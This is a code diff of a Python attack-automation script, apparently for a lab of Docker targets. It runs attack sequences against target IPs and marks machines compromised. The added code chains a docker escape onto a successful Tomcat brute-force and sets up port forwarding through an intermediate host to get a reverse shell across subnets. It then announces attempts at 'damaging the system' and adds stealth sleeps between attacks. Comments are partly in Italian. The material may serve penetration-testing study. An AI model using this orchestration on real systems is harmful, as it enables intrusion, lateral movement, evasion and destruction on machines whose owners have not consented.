@@ -76,7 +76,7 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 attack_name = attack_sequence_list[attack_sequence_index]
                 attack_sequence_index += 1
 
-                LPORT = C.DEFAULT_LPORT
+                LPORT = C.DEFAULT_LPORT #Pentester listening port
 
                 for p in C.TARGETS_DOCKERS[target_ip]:
                     LPORT = p["exposed_port"]
@@ -93,18 +93,38 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                 session = mc.attempt_attack(attack_obj)
 
                 if session:
+                    #si controlla che il successo dell'attacco non sia un falso positivo
                     if session[0] == target_ip:
                         atk_sess = session[1:2][0]["id_sess"]
                         print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                         print(f"{C.COL_GREEN}[+] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -{C.COL_RESET}")
                         compromised_machines.add(target_ip)
                         uncompromised_machines.remove(target_ip)
+
+                        if(attack_name=="bruteForce"):
+                            print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
+                            print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
+
+                        #prepariamo le regole di port forwarding usando la macchina intermedia su cui l'attacco docker escape si connette
+                        #questa macchina intermedia effettuerà un portfwd sulla macchina attaccante permettendoci di ottenere una reverse shell
+                        #sulla macchina che è in un'altra sottorete e che normalmente non permetterebbe di ottenere una reverse shell.
+                        #verrà inoltre rimossa la regola di routing perché non più necessaria una volta che abbiamo una sessione
+                            mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
+                            docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
+                            escape = mc.docker_escape(docker_escape_attack_object)
+                            if(escape):
+                                print(f"{C.COL_GREEN} docker_escape successful! Trying damaging the system...  {C.COL_RESET}")
+                            else:
+                                print(f"{C.COL_RED}docker_escape failed! Aborting...  {C.COL_RESET}")
+                                break  
+
                         break
                     else:
                         print(f"{C.COL_YELLOW}[*] false positive occurred, ignoring... {C.COL_RESET}")
                 else:
                     uncompromised_machines.add(target_ip)
                     print(f"{C.COL_RED}[-] Exploit failed {C.COL_RESET}")
+                    
 
                 if stealth_sleep:
                     print(f"{C.COL_YELLOW}[*] sleeping {stealth_sleep} seconds to make the attack stealthier...{C.COL_RESET}")
